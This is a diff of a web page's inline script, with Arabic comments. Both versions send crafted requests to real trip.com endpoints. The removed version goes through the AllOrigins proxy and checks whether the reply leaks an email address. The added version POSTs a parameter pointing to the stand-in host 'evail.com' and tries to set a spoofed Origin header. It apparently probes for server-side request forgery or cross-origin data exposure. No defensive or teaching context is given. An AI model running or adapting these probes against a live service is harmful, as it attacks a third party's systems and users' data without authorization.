@@ -8,55 +8,36 @@
 
 <script>
 
-// ===== استخدم AllOrigins بالطريقة الصحيحة =====
-const PROXY_URL = "https://api.allorigins.win/get?url=";
-const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
+// ===== إرسال الطلب إلى chloro.trip.com =====
+const TARGET_URL = "https://chloro.trip.com/v2/d";
 
-// البيانات المرسلة لـ Trip.com
-const tripData = {
-    head: {
-        locale: "ar-XX",
-        currency: "USD",
-        vID: "1783978788105.8e68P1hvGdSY"
-    },
-    platform: "Online",
-    componentType: "online-app-download-universal",
-    version: "6.0.5",
-    pageId: "10320668148",
-    aid: 0,
-    sid: 0,
-    customId: "side",
-    customParam: {}
-};
+// ===== البيانات (body) المرسلة =====
+const requestBody = "data=&version=11&serverName=http://evail.com";
 
-// ===== إرسال الطلب عبر Proxy =====
-fetch(PROXY_URL + encodeURIComponent(TARGET_URL), {
+// ===== إرسال الطلب =====
+fetch(TARGET_URL, {
     method: "POST",
     headers: {
-        "Content-Type": "application/json"
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "*/*",
+        "Origin": "https://www.com"
     },
-    body: JSON.stringify(tripData)
+    body: requestBody
 })
 
-// AllOrigins يرجع JSON فيه حقل contents
-.then(r => r.json())
-.then(data => {
-    // الرد الأصلي موجود في data.contents
-    const responseText = data.contents;
+.then(async r => {
+    const status = r.status;
+    const responseText = await r.text();
     
     document.getElementById("result").textContent = 
-    "Status: 200\n\n" + responseText;
+    "Status: " + status + "\n\n" + responseText;
     
-    // محاولة استخراج الإيميل من الرد للتحقق
+    // محاولة استخراج البيانات من الرد
     try {
         const jsonResponse = JSON.parse(responseText);
-        if (jsonResponse.email) {
-            console.log("✅ الإيميل موجود:", jsonResponse.email);
-        } else {
-            console.log("⚠️ الإيميل غير موجود في الرد");
-        }
+        console.log("✅ الرد:", jsonResponse);
     } catch(e) {
-        console.log("الرد ليس JSON صالح");
+        console.log("الرد ليس JSON");
     }
 })
 
